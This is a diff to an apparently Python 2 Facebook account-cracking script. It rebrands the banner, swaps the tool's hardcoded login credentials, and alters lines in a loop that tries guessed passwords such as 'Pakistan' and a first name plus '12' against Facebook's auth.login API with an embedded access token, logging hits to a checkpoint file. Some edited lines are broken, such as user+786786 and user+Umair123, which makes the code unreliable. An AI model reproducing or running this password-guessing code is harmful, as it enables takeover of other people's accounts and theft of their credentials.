@@ -57,10 +57,10 @@ logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr
  ██ ▄█▀ ▒█████   ███▄ ▄███▓ ▄▄▄       ██▓ ██▓    
  ██▄█▒ ▒██▒  ██▒▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    
 ▓███▄░ ▒██░  ██▒▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    
-▓██ █▄ ▒██   ██░▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░    
-▒██▒ █▄░ ████▓▒░▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒
+▓Umaor
+
 ▒ ▒▒ ▓▒░ ▒░▒░▒░ ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░
-░ ░▒ ▒░  ░ ▒ ▒░ ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░
+░ ░▒   ░ ▒ ▒░ ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░
 ░ ░░ ░ ░ ░ ░ ▒  ░      ░     ░   ▒    ▒ ░  ░ ░   
 ░  ░       ░ ░         ░         ░  ░ ░      ░  ░
                                                  
@@ -130,8 +130,8 @@ print  """\033[1;91m
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "komail"
-CorrectPassword = "khan"
+CorrectUsername = "Dj"
+CorrectPassword = "Umii"
 
 loop = 'true'
 while (loop == 'true'):
@@ -385,7 +385,7 @@ def pilih_super():
 									cek = open("out/checkpoint.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
-									cekpoint.append(user+pass3)
+									cekpoint.append(user+786786)
 								else:
 									pass4 = 'Pakistan'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -399,7 +399,7 @@ def pilih_super():
 											cek = open("out/checkpoint.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
-											cekpoint.append(user+pass4)
+											cekpoint.append(user+Umair123)
 										else:
 											pass5 = b['first_name'] + '12'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
